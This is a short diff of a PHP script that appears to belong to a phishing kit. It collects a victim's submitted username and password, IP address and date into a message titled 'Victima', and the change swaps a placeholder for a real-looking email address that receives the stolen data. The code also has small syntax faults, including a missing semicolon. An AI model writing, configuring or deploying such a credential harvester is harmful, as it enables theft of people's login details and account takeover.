@@ -10,7 +10,7 @@ if( (empty($usuario)) or (empty($password)) ){
 }else{
 
 
-$micorreo = "su email";
+$micorreo = "senorrockstart98@hotmail.com";
 $asunto = "Victima"
 $mensaje ="\n\nUsuario: ".$usuario."\n\nContraseña: ".$password."\n\nIP: " .$ip."\n\Fecha: ".$fecha;
 
